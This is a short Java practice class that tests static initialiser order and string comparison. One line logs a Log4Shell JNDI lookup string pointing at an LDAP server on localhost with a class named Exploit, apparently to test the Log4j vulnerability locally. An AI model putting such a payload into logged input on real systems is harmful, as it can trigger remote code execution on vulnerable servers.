package com.tik.mysystem.system.main;

import lombok.extern.slf4j.Slf4j;

@Slf4j
public class MyMain {

    static int i = 15;

    public static void main(String[] args) {
        log.error("${jndi:ldap://localhost:8888/Exploit}");
        log.info("i={}", i);

        String a = "a";
        String b = "a";
        System.out.println(a == b);
        System.out.println(a.equals(b));
    }

    static {
        i += 3;
    }

    static {
        i /= 3;
    }

}
